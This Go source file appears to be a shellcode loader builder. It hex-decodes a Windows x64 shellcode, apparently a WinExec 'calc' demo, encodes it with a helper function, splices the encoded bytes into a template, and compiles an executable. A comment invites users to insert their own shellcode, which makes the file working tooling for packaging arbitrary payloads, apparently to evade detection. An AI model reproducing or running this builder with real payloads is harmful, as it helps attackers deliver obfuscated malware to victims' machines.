package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	u "icecold/util"
	"os"
	"os/exec"
)

func main() {
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	// Put Your shellcode below
	//shellcode := []byte{}
	el := u.Enc(shellcode)
	// Prepare the encode list to be written in template/main.go
	t := ""
	for i := 0; i < len(el); i++ {
		if i != len(el)-1 {
			t += fmt.Sprintf("\"%s\",", el[i])
		} else {
			t += fmt.Sprintf("\"%s\"", el[i])
		}
	}
	f, err := os.ReadFile("template/template.txt")
	if err != nil {
		panic(err)
	}
	i := bytes.Index(f, []byte("CHANGE_ME"))
	// Prepare content of teplate/main.go
	p := ""
	p += fmt.Sprintf("%s", string(f[0:i]))
	p += fmt.Sprintf("%s", t)
	p += fmt.Sprintf("%s", string(f[i+9:]))
	m, err := os.Create("template/main.go")
	if err != nil {
		panic(err)
	}
	defer m.Close()
	_, err = m.WriteString(p)
	if err != nil {
		panic(err)
	}
	// compile
	cmd := exec.Command("go", "build", "-o", "output/a.exe", "template/main.go")
	cmd.Run()

}
